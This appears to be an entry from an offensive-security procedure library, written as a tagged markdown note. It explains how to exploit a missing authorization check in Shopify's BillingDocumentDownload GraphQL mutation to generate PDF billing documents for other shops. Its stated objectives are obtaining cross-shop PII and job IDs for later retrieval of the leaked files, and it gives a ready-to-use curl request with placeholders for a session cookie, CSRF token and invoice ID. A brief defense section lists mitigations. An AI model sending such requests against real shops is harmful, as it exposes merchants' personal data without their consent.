---
tags:
  - idor
  - graphql
  - shopify
  - pdf-leak
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/shopify-graphql-billingdocumentdownload-mutation]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Account Discovery]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f1680455-9028-42c1-8541-91503150778a
created_at: '2025-12-14T17:26:00.234Z'
updated_at: '2025-12-14T17:26:00.234Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Account Discovery]]'
---
# Generate-Billing-Document-PDF-via-GraphQL-Mutation

## Summary

This procedure uses the BillingDocumentDownload GraphQL mutation to generate a PDF job for an arbitrary billing invoice, exploiting IDOR to create documents containing leaked PII like full addresses and emails from other merchants.

## Description

The mutation lacks authorization checks on the invoice ID, allowing any authenticated user to queue a PDF (invoice or credit note) for another shop's billing document. The resulting PDF often embeds victim-specific details despite superficial headers from the attacker's session. This extends the IDOR to document exfiltration, useful for obtaining printable PII in security assessments of billing systems.

## Requirements

1. Authenticated Shopify admin session with Cookie and X-Csrf-Token
2. Arbitrary BillingInvoice global ID from prior enumeration
3. HTTP client for GraphQL mutations
4. documentType enum value (e.g., INVOICE, CREDIT_NOTE)

## Defense

Defensive measures and detection strategies:

- Enforce ID ownership validation in mutation resolvers before queuing jobs
- Use indirect references or signed URLs for document generation tied to user context
- Log and alert on PDF generation requests for non-owned IDs
- Implement CAPTCHA or secondary auth for sensitive document downloads

## Objectives

1. Generate unauthorized PDF documents embedding cross-shop PII
2. Obtain job IDs for subsequent retrieval of leaked files
3. Escalate data leakage from JSON to formatted documents

## Instructions

### Step 1: Select Document Type

**Context**: Choose the type of billing document to generate, such as CREDIT_NOTE for credits or INVOICE for full bills.

### Step 2: Prepare Mutation Payload

**Context**: Construct the GraphQL mutation with the arbitrary ID and documentType.

### Step 3: Send Mutation Request

**Context**: Execute the mutation to initiate the PDF job, checking for success via job ID.

**Command** ([[commands/shopify-graphql-billingdocumentdownload-mutation]]):
```bash
curl -X POST "https://admin.shopify.com/api/shopify/[shop]/graph?operation=BillingDocumentDownload&type=mutation" \
  -H "Content-Type: application/json" \
  -H "Cookie: [your_session_cookie]" \
  -H "X-Csrf-Token: [your_csrf_token]" \
  -d '{"operationName":"BillingDocumentDownload","variables":{"id":"gid://shopify/BillingInvoice/12345","documentType":"CREDIT_NOTE"},"query":"mutation BillingDocumentDownload($id: ID!, $documentType: BillingDocumentType) { billingDocumentDownload(id: $id, documentType: $documentType) { job { id __typename } userErrors { field message __typename } __typename } }"}'
```

> The response includes a job.id if successful. No userErrors indicate the job is created, allowing PDF access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-graphql-billingdocumentdownload-mutation]]

## Tools Used


## Tags

- idor
- graphql
- shopify
- pdf-leak
